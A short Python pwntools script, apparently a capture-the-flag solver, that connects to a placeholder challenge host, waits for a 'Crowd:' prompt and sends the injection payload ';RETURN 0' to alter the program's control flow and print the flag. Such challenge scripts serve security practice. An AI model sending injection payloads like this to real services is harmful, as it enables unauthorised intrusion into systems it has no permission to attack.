#!/usr/bin/env python3
from pwn import *

# Change these
HOST = "challenge.host.com"
PORT = 12345

def main():
    # Connect to remote service
    conn = remote(HOST, PORT)

    # Wait until program asks for crowd input
    conn.recvuntil(b"Crowd:")

    # Inject control flow manipulation payload
    payload = b";RETURN 0"
    conn.sendline(payload)

    # Receive everything (including flag)
    response = conn.recvall(timeout=2)
    print(response.decode(errors="ignore"))

    conn.close()

if __name__ == "__main__":
    main()